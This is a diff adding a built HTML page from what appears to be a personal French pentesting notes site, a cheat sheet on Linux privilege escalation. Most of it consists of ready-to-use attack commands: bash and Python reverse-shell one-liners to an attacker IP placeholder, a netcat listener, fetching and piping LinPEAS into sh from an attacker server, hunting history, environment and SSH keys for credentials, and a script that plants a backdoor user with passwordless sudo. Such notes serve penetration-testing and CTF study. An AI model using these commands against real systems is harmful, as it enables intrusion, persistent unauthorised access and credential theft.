@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="fr" dir="auto" data-theme="dark">
+
+<head><script src="/shingsi/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=shingsi/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Privesclinux | Shingsi</title>
+<meta name="keywords" content="">
+<meta name="description" content="Reverse Shells
+Listener (Machine Attaquante)
+nc -lvnp &lt;PORT&gt;
+Payloads (Machine Victime)
+bash
+bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
+python
+python3 -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;IP&gt;&#34;,&lt;PORT&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/bash&#34;)&#39;
+Stabilisation du Shell (TTY)
+Indispensable pour avoir l&rsquo;auto-complétion, les flèches et le CTRL&#43;C.
+
+Dans le shell distant :
+
+python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+
+Faire CTRL&#43;Z (met le shell en pause).
+Dans mon terminal :
+
+stty raw -echo; fg
+
+Dans le shell distant (qui revient au premier plan) :
+
+reset
+export TERM=xterm-256color
+export SHELL=bash
+Transfert de fichiers
+Pour envoyer des fichiers vers la cible.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/shingsi/cheatsheet/privesclinux/">
+<link crossorigin="anonymous" href="/shingsi/assets/css/stylesheet.e89e7af70eb9102beb31bdbfad88d5aff85ffa1e897632cc684c32d65f5bc528.css" integrity="sha256-6J569w65ECvrMb2/rYjVr/hf&#43;h6JdjLMaEwy1l9bxSg=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/shingsi/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/shingsi/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/shingsi/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/shingsi/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/shingsi/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="fr" href="http://localhost:1313/shingsi/cheatsheet/privesclinux/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/shingsi/" accesskey="h" title="Shingsi (Alt + H)">Shingsi</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/shingsi/cheatsheet/" title="Cheatsheet">
+                    <span>Cheatsheet</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/shingsi/projets/" title="Projets">
+                    <span>Projets</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/shingsi/rapports/" title="Rapports">
+                    <span>Rapports</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/shingsi/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Privesclinux
+    </h1>
+    <div class="post-meta"><span title='2026-04-03 03:31:43 +0200 CEST'>3 avril 2026</span>
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Sommaire</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#reverse-shells" aria-label="Reverse Shells">Reverse Shells</a><ul>
+                        
+                <li>
+                    <a href="#listener-machine-attaquante" aria-label="Listener (Machine Attaquante)">Listener (Machine Attaquante)</a></li>
+                <li>
+                    <a href="#payloads-machine-victime" aria-label="Payloads (Machine Victime)">Payloads (Machine Victime)</a></li></ul>
+                </li>
+                <li>
+                    <a href="#stabilisation-du-shell-tty" aria-label="Stabilisation du Shell (TTY)">Stabilisation du Shell (TTY)</a></li>
+                <li>
+                    <a href="#transfert-de-fichiers" aria-label="Transfert de fichiers">Transfert de fichiers</a><ul>
+                        
+                <li>
+                    <a href="#serveur-attaquant" aria-label="Serveur (Attaquant)">Serveur (Attaquant)</a></li>
+                <li>
+                    <a href="#t%c3%a9l%c3%a9chargement-victime" aria-label="Téléchargement (Victime)">Téléchargement (Victime)</a><ul>
+                        
+                <li>
+                    <a href="#via-wget" aria-label="Via wget">Via wget</a></li>
+                <li>
+                    <a href="#via-curl" aria-label="Via curl">Via curl</a></li>
+                <li>
+                    <a href="#ex%c3%a9cution-directe-en-m%c3%a9moire-sans-%c3%a9crire-sur-le-disque" aria-label="Exécution directe en mémoire (sans écrire sur le disque)">Exécution directe en mémoire (sans écrire sur le disque)</a></li>
+                <li>
+                    <a href="#netcat" aria-label="Netcat">Netcat</a></li>
+                <li>
+                    <a href="#ssh--scp" aria-label="SSH / SCP">SSH / SCP</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#%c3%a9l%c3%a9vation-de-privil%c3%a8ges-linux" aria-label="Élévation de Privilèges Linux">Élévation de Privilèges Linux</a><ul>
+                        
+                <li>
+                    <a href="#%c3%a9num%c3%a9ration-rapide" aria-label="Énumération rapide">Énumération rapide</a><ul>
+                        
+                <li>
+                    <a href="#droits-sudo-sans-mot-de-passe" aria-label="Droits sudo sans mot de passe">Droits sudo sans mot de passe</a></li>
+                <li>
+                    <a href="#groupes-de-lutilisateur-docker-lxd-etc" aria-label="Groupes de l&rsquo;utilisateur (docker, lxd, etc.)">Groupes de l&rsquo;utilisateur (docker, lxd, etc.)</a></li>
+                <li>
+                    <a href="#version-du-kernel" aria-label="Version du Kernel">Version du Kernel</a></li>
+                <li>
+                    <a href="#fichiers-suid" aria-label="Fichiers SUID">Fichiers SUID</a></li>
+                <li>
+                    <a href="#trouver-fichierdossier-ou-on-peut-%c3%a9crire" aria-label="Trouver fichier/dossier ou on peut écrire">Trouver fichier/dossier ou on peut écrire</a></li></ul>
+                </li>
+                <li>
+                    <a href="#checklist-d%c3%a9num%c3%a9ration" aria-label="Checklist d&rsquo;Énumération">Checklist d&rsquo;Énumération</a><ul>
+                        
+                <li>
+                    <a href="#1-identit%c3%a9-et-groupes" aria-label="1. Identité et Groupes">1. Identité et Groupes</a></li>
+                <li>
+                    <a href="#2-environnement-et-kernel" aria-label="2. Environnement et Kernel">2. Environnement et Kernel</a></li>
+                <li>
+                    <a href="#3-services-et-processus" aria-label="3. Services et Processus">3. Services et Processus</a></li>
+                <li>
+                    <a href="#4-historique-et-utilisateurs" aria-label="4. Historique et Utilisateurs">4. Historique et Utilisateurs</a></li></ul>
+                </li>
+                <li>
+                    <a href="#cr%c3%a9ation-utilisateur-root" aria-label="Création utilisateur root">Création utilisateur root</a></li></ul>
+                </li>
+                <li>
+                    <a href="#permissions" aria-label="Permissions">Permissions</a></li>
+                <li>
+                    <a href="#le-bit-suid-set-user-id" aria-label="Le Bit SUID (Set User ID)">Le Bit SUID (Set User ID)</a><ul>
+                        
+                <li>
+                    <a href="#rep%c3%a9rer-le-bit-s" aria-label="Repérer le bit &ldquo;s&rdquo;">Repérer le bit &ldquo;s&rdquo;</a></li>
+                <li>
+                    <a href="#trouver-tous-les-fichiers-suid" aria-label="Trouver tous les fichiers SUID">Trouver tous les fichiers SUID</a></li></ul>
+                </li>
+                <li>
+                    <a href="#fichiers-critiques-%c3%a0-inspecter" aria-label="Fichiers Critiques à Inspecter">Fichiers Critiques à Inspecter</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="reverse-shells">Reverse Shells<a hidden class="anchor" aria-hidden="true" href="#reverse-shells">#</a></h2>
+<h3 id="listener-machine-attaquante">Listener (Machine Attaquante)<a hidden class="anchor" aria-hidden="true" href="#listener-machine-attaquante">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp &lt;PORT&gt;
+</span></span></code></pre></div><h3 id="payloads-machine-victime">Payloads (Machine Victime)<a hidden class="anchor" aria-hidden="true" href="#payloads-machine-victime">#</a></h3>
+<p>bash</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>python</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;IP&gt;&#34;,&lt;PORT&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><h2 id="stabilisation-du-shell-tty">Stabilisation du Shell (TTY)<a hidden class="anchor" aria-hidden="true" href="#stabilisation-du-shell-tty">#</a></h2>
+<p>Indispensable pour avoir l&rsquo;auto-complétion, les flèches et le CTRL+C.</p>
+<ol>
+<li>Dans le shell distant :</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><ol start="2">
+<li>Faire <code>CTRL+Z</code> (met le shell en pause).</li>
+<li>Dans mon terminal :</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>stty raw -echo; fg
+</span></span></code></pre></div><ol start="4">
+<li>Dans le shell distant (qui revient au premier plan) :</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>reset
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm-256color
+</span></span><span style="display:flex;"><span>export SHELL<span style="color:#f92672">=</span>bash
+</span></span></code></pre></div><h2 id="transfert-de-fichiers">Transfert de fichiers<a hidden class="anchor" aria-hidden="true" href="#transfert-de-fichiers">#</a></h2>
+<p>Pour envoyer des fichiers vers la cible.</p>
+<p>LinPEAS (détection privesc) : <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS</a></p>
+<p>pspy (monitoring process) : <a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p>
+<h3 id="serveur-attaquant">Serveur (Attaquant)<a hidden class="anchor" aria-hidden="true" href="#serveur-attaquant">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span></code></pre></div><h3 id="téléchargement-victime">Téléchargement (Victime)<a hidden class="anchor" aria-hidden="true" href="#téléchargement-victime">#</a></h3>
+<h4 id="via-wget">Via wget<a hidden class="anchor" aria-hidden="true" href="#via-wget">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://&lt;IP_ATTACKER&gt;/linpeas.sh
+</span></span></code></pre></div><h4 id="via-curl">Via curl<a hidden class="anchor" aria-hidden="true" href="#via-curl">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://&lt;IP_ATTACKER&gt;/linpeas.sh -o linpeas.sh
+</span></span></code></pre></div><h4 id="exécution-directe-en-mémoire-sans-écrire-sur-le-disque">Exécution directe en mémoire (sans écrire sur le disque)<a hidden class="anchor" aria-hidden="true" href="#exécution-directe-en-mémoire-sans-écrire-sur-le-disque">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://&lt;IP_ATTACKER&gt;/linpeas.sh | sh
+</span></span></code></pre></div><h4 id="netcat">Netcat<a hidden class="anchor" aria-hidden="true" href="#netcat">#</a></h4>
+<p>Depuis victime</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -vl <span style="color:#ae81ff">44444</span> &gt; fichier
+</span></span></code></pre></div><p>Envoyer le fichier à la vitcime depuis attaquant</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -n TargetIP <span style="color:#ae81ff">44444</span> &lt; fichier
+</span></span></code></pre></div><h4 id="ssh--scp">SSH / SCP<a hidden class="anchor" aria-hidden="true" href="#ssh--scp">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scp /chemin/vers/LinEnum.sh user@10.10.X.X:/chemin/de/destination
+</span></span></code></pre></div><h2 id="élévation-de-privilèges-linux">Élévation de Privilèges Linux<a hidden class="anchor" aria-hidden="true" href="#élévation-de-privilèges-linux">#</a></h2>
+<h3 id="énumération-rapide">Énumération rapide<a hidden class="anchor" aria-hidden="true" href="#énumération-rapide">#</a></h3>
+<h4 id="droits-sudo-sans-mot-de-passe">Droits sudo sans mot de passe<a hidden class="anchor" aria-hidden="true" href="#droits-sudo-sans-mot-de-passe">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div><h4 id="groupes-de-lutilisateur-docker-lxd-etc">Groupes de l&rsquo;utilisateur (docker, lxd, etc.)<a hidden class="anchor" aria-hidden="true" href="#groupes-de-lutilisateur-docker-lxd-etc">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>id
+</span></span></code></pre></div><h4 id="version-du-kernel">Version du Kernel<a hidden class="anchor" aria-hidden="true" href="#version-du-kernel">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>uname -a
+</span></span></code></pre></div><h4 id="fichiers-suid">Fichiers SUID<a hidden class="anchor" aria-hidden="true" href="#fichiers-suid">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span></code></pre></div><h4 id="trouver-fichierdossier-ou-on-peut-écrire">Trouver fichier/dossier ou on peut écrire<a hidden class="anchor" aria-hidden="true" href="#trouver-fichierdossier-ou-on-peut-écrire">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -type f -maxdepth <span style="color:#ae81ff">2</span> -writable
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -type d -maxdepth <span style="color:#ae81ff">2</span> -writable
+</span></span></code></pre></div><hr>
+<h3 id="checklist-dénumération">Checklist d&rsquo;Énumération<a hidden class="anchor" aria-hidden="true" href="#checklist-dénumération">#</a></h3>
+<h4 id="1-identité-et-groupes">1. Identité et Groupes<a hidden class="anchor" aria-hidden="true" href="#1-identité-et-groupes">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>id
+</span></span></code></pre></div><ul>
+<li>Vérifie si tu es dans des groupes spéciaux : <code>docker</code>, <code>lxd</code>, <code>sudo</code>, <code>video</code>, <code>disk</code>.</li>
+</ul>
+<h4 id="2-environnement-et-kernel">2. Environnement et Kernel<a hidden class="anchor" aria-hidden="true" href="#2-environnement-et-kernel">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>uname -a             <span style="color:#75715e"># Version du Kernel (Exploits Kernel)</span>
+</span></span><span style="display:flex;"><span>cat /etc/os-release  <span style="color:#75715e"># Version de la distribution</span>
+</span></span><span style="display:flex;"><span>env                  <span style="color:#75715e"># Variables d&#39;environnement (mots de passe cachés)</span>
+</span></span></code></pre></div><h4 id="3-services-et-processus">3. Services et Processus<a hidden class="anchor" aria-hidden="true" href="#3-services-et-processus">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ps aux | grep root   <span style="color:#75715e"># Processus lancés par root</span>
+</span></span><span style="display:flex;"><span>ss -lntp             <span style="color:#75715e"># Ports ouverts en local (127.0.0.1) non vus par Nmap</span>
+</span></span></code></pre></div><h4 id="4-historique-et-utilisateurs">4. Historique et Utilisateurs<a hidden class="anchor" aria-hidden="true" href="#4-historique-et-utilisateurs">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>history              <span style="color:#75715e"># Commandes tapées par l&#39;utilisateur (souvent des mots de passe)</span>
+</span></span><span style="display:flex;"><span>ls -la /home         <span style="color:#75715e"># Lister les autres utilisateurs</span>
+</span></span><span style="display:flex;"><span>ls -la ~/.ssh        <span style="color:#75715e"># Chercher des clés privées (id_rsa)</span>
+</span></span></code></pre></div><h3 id="création-utilisateur-root">Création utilisateur root<a hidden class="anchor" aria-hidden="true" href="#création-utilisateur-root">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span>useradd -m -s /bin/bash shingsi
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;shingsi:shingsi&#39;</span> | chpasswd
+</span></span><span style="display:flex;"><span>usermod -aG sudo shingsi <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#39;shingsi ALL=(ALL) NOPASSWD:ALL&#39;</span> &gt; /etc/sudoers.d/shingsi <span style="color:#f92672">&amp;&amp;</span> chmod <span style="color:#ae81ff">440</span> /etc/sudoers.d/shingsi
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;[-] LEZGONG!&#39;</span> &gt; /tmp/check
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;[-] LEZGONG!&#39;</span> &gt; check
+</span></span></code></pre></div><hr>
+<h2 id="permissions">Permissions<a hidden class="anchor" aria-hidden="true" href="#permissions">#</a></h2>
+<p>Comprendre comment Linux gère les droits est crucial pour identifier une faille de configuration.</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Valeur</th>
+          <th style="text-align: left">Lettre</th>
+          <th style="text-align: left">Action</th>
+          <th style="text-align: left">Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>4</strong></td>
+          <td style="text-align: left"><code>r</code></td>
+          <td style="text-align: left">Read</td>
+          <td style="text-align: left">Lire le fichier ou lister le dossier</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>2</strong></td>
+          <td style="text-align: left"><code>w</code></td>
+          <td style="text-align: left">Write</td>
+          <td style="text-align: left">Modifier/Supprimer le fichier</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>1</strong></td>
+          <td style="text-align: left"><code>x</code></td>
+          <td style="text-align: left">Execute</td>
+          <td style="text-align: left">Lancer le programme / Entrer dans le dossier</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>Combinaisons courantes :</strong></p>
+<ul>
+<li><strong>777</strong> (<code>rwxrwxrwx</code>) : Tout le monde peut tout faire.</li>
+<li><strong>755</strong> (<code>rwxr-xr-x</code>) : Standard. Proprio a tous les droits, les autres lisent/exécutent.</li>
+<li><strong>600</strong> (<code>rw-------</code>) : Privé. Seul le propriétaire peut lire et modifier.</li>
+</ul>
+<hr>
+<h2 id="le-bit-suid-set-user-id">Le Bit SUID (Set User ID)<a hidden class="anchor" aria-hidden="true" href="#le-bit-suid-set-user-id">#</a></h2>
+<p>C&rsquo;est la cible n°1 en PrivEsc. Un fichier avec le bit <strong>s</strong> s&rsquo;exécute avec les privilèges du <strong>propriétaire</strong> (souvent root), peu importe qui le lance.</p>
+<h3 id="repérer-le-bit-s">Repérer le bit &ldquo;s&rdquo;<a hidden class="anchor" aria-hidden="true" href="#repérer-le-bit-s">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -la /usr/bin/passwd
+</span></span></code></pre></div><h3 id="trouver-tous-les-fichiers-suid">Trouver tous les fichiers SUID<a hidden class="anchor" aria-hidden="true" href="#trouver-tous-les-fichiers-suid">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span></code></pre></div><blockquote>
+<p><strong>Réflexe :</strong> Si on trouve un binaire non-standard (ex: python, vim, find, nano) avec un SUID root, consulter <strong>GTFOBins</strong>.</p>
+</blockquote>
+<hr>
+<h2 id="fichiers-critiques-à-inspecter">Fichiers Critiques à Inspecter<a hidden class="anchor" aria-hidden="true" href="#fichiers-critiques-à-inspecter">#</a></h2>
+<p><img alt="Filesystem" loading="lazy" src="/shingsi/images/NEW_filesystem.webp"></p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Fichier</th>
+          <th style="text-align: left">Pourquoi le regarder ?</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><code>/etc/passwd</code></td>
+          <td style="text-align: left">Liste des utilisateurs. Vérifie qui a un shell <code>/bin/bash</code>. Si on a les droits d&rsquo;écriture sur ce fichier, ajout utilisateur root.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>/etc/shadow</code></td>
+          <td style="text-align: left">Contient les hashes des mots de passe (si lisible = root instantané).</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>/etc/crontab</code></td>
+          <td style="text-align: left">Tâches planifiées. Cherche des scripts écrits par root que tu peux modifier.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>config.php</code>, <code>settings.py</code></td>
+          <td style="text-align: left">Souvent dans <code>/var/www/html/</code>. Contiennent les codes BDD.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>~/.bash_history</code></td>
+          <td style="text-align: left">Historique des commandes. Peut contenir des mots de passe en clair.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><code>/tmp</code> ou <code>/dev/shm</code></td>
+          <td style="text-align: left">Seuls dossiers où tu as presque toujours le droit d&rsquo;écrire/exécuter.</td>
+      </tr>
+  </tbody>
+</table>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/shingsi/">Shingsi</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
